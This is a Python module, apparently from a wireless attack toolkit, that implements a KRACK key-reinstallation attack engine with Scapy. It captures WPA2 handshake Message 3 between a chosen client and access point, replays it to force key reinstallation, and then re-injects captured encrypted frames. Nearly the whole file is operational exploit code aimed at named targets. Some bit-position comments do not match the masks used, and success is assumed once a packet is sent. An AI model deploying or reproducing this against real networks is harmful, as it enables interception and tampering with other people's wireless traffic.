"""
KRACK (Key Reinstallation Attack) Engine
-----------------------------------------
Exploits CVE-2017-13077 / CVE-2017-13078 (802.11i 4-way handshake).
Forces key reinstallation on the client by replaying Message 3 of the
4-way handshake, causing nonce/replay counter reset.

After successful reinstallation, replays captured encrypted data packets
to decrypt traffic or inject frames.

Platform: Linux only (requires monitor mode and patched Scapy).
"""

import time
import threading
from collections import defaultdict

from scapy.all import sniff, sendp, raw
from scapy.layers.dot11 import Dot11, RadioTap
from scapy.layers.eap import EAPOL

from .config import IS_WINDOWS, IS_LINUX, WIFI_BROADCAST, log


class KRACKEngine:
    """
    Key Reinstallation Attack engine targeting 4-way handshake.

    Monitors for EAPOL Message 3 from the AP and replays it to force
    the client to reinstall the PTK, resetting nonce counters.
    After reinstallation, previously captured encrypted frames are replayed.
    """

    def __init__(self, interface, target_client, target_bssid):
        self.interface = interface
        self.target_client = target_client
        self.target_bssid = target_bssid
        self.running = False
        self._thread = None
        self._replay_thread = None

        # Handshake state tracking
        self._msg3_frames = []  # Captured Message 3 frames
        self._encrypted_frames = []  # Captured encrypted data for replay
        self._key_reinstalled = False
        self._reinstall_count = 0
        self._max_replays = 10  # Safety limit on replay attempts

    def start(self):
        """Start KRACK attack engine."""
        if IS_WINDOWS:
            log.warning("KRACK engine is Linux-only. Skipping on Windows.")
            return False
        if self.running:
            return True
        if not self.target_client or not self.target_bssid:
            log.error("KRACK: target_client and target_bssid are required")
            return False

        self.running = True
        self._thread = threading.Thread(target=self._monitor_handshake, daemon=True)
        self._thread.start()

        log.info(f"KRACK engine started: monitoring {self.target_client} <-> {self.target_bssid}")
        return True

    def stop(self):
        """Stop KRACK attack."""
        self.running = False
        if self._thread:
            self._thread.join(timeout=5)
        if self._replay_thread:
            self._replay_thread.join(timeout=5)
        log.info(f"KRACK engine stopped. Reinstallations forced: {self._reinstall_count}")

    def _monitor_handshake(self):
        """
        Sniff for EAPOL frames between the target client and AP.
        Identify Message 3 (AP -> Client) for replay.
        """
        def handler(pkt):
            if not self.running:
                return
            if not pkt.haslayer(EAPOL):
                return
            if not pkt.haslayer(Dot11):
                return

            # Check if this frame involves our target
            addr1 = pkt.addr1  # Destination
            addr2 = pkt.addr2  # Source
            addr3 = pkt.addr3  # BSSID

            # Message 3: AP -> Client (addr1=client, addr2=AP, addr3=AP)
            is_msg3 = (
                addr1 == self.target_client
                and addr2 == self.target_bssid
                and addr3 == self.target_bssid
            )

            if is_msg3:
                eapol_data = raw(pkt.getlayer(EAPOL))
                msg_type = self._identify_eapol_msg(eapol_data)
                if msg_type == 3:
                    self._msg3_frames.append(pkt)
                    log.info(f"KRACK: Captured Message 3 (total: {len(self._msg3_frames)})")
                    # Trigger replay attack
                    self._replay_msg3(pkt)

            # Also capture encrypted data frames for post-reinstall replay
            if pkt.haslayer(Dot11) and pkt.type == 2:
                # Data frame from AP to client
                if addr1 == self.target_client and addr2 == self.target_bssid:
                    if pkt.FCfield & 0x40:  # Protected frame
                        if len(self._encrypted_frames) < 100:
                            self._encrypted_frames.append(pkt)

        try:
            sniff(iface=self.interface, prn=handler, store=0,
                  stop_filter=lambda x: not self.running)
        except Exception as e:
            log.error(f"KRACK monitor error: {e}")

    def _identify_eapol_msg(self, eapol_data):
        """
        Identify EAPOL message number from key info field.
        Message 3: Key Info has Install bit set, ACK set, MIC set.
        """
        try:
            if len(eapol_data) < 7:
                return None
            # EAPOL-Key frame: type(1) + key_info(2) + key_length(2) + ...
            # Key Info is at offset 1-2 in the EAPOL-Key body
            # After EAPOL header (4 bytes): version(1), type(1), length(2)
            # Then Key Descriptor: type(1), key_info(2)
            key_info = (eapol_data[5] << 8) | eapol_data[6]

            # Key Info bits:
            # Bit 3: Install
            # Bit 6: ACK
            # Bit 8: MIC
            install = bool(key_info & 0x0040)
            ack = bool(key_info & 0x0080)
            mic = bool(key_info & 0x0100)
            secure = bool(key_info & 0x0200)

            if ack and not mic:
                return 1  # Message 1: ACK, no MIC
            elif not ack and mic and not install:
                return 2  # Message 2: MIC, no ACK, no Install
            elif ack and mic and install:
                return 3  # Message 3: ACK, MIC, Install
            elif not ack and mic and secure:
                return 4  # Message 4: MIC, Secure, no ACK
        except (IndexError, TypeError):
            pass
        return None

    def _replay_msg3(self, msg3_pkt):
        """
        Replay Message 3 to force key reinstallation on the client.
        CVE-2017-13077: replaying msg3 causes PTK reinstallation.
        """
        if self._reinstall_count >= self._max_replays:
            log.warning("KRACK: Max replay attempts reached, stopping replays")
            return

        try:
            # Send multiple copies with slight delay to ensure delivery
            for _ in range(3):
                sendp(msg3_pkt, iface=self.interface, verbose=False)
                time.sleep(0.05)

            self._reinstall_count += 1
            self._key_reinstalled = True
            log.info(f"KRACK: Message 3 replayed (attempt #{self._reinstall_count})")

            # After successful replay, inject captured encrypted packets
            if self._encrypted_frames:
                self._replay_thread = threading.Thread(
                    target=self._inject_replayed_packets, daemon=True)
                self._replay_thread.start()

        except Exception as e:
            log.error(f"KRACK: Message 3 replay failed: {e}")

    def _inject_replayed_packets(self):
        """
        After key reinstallation, replay captured encrypted packets.
        With reset nonce counters, these may be decrypted by the client
        or allow traffic injection.
        """
        if not self._key_reinstalled:
            return

        log.info(f"KRACK: Replaying {len(self._encrypted_frames)} encrypted frames")
        replayed = 0

        for frame in self._encrypted_frames[:50]:  # Limit replay burst
            if not self.running:
                break
            try:
                sendp(frame, iface=self.interface, verbose=False)
                replayed += 1
                time.sleep(0.01)
            except Exception as e:
                log.error(f"KRACK: Packet replay error: {e}")
                break

        log.info(f"KRACK: Replayed {replayed} encrypted frames after key reinstall")

    def get_stats(self):
        """Return KRACK attack statistics."""
        return {
            "target_client": self.target_client,
            "target_bssid": self.target_bssid,
            "msg3_captured": len(self._msg3_frames),
            "encrypted_frames_captured": len(self._encrypted_frames),
            "key_reinstalled": self._key_reinstalled,
            "reinstall_count": self._reinstall_count,
        }
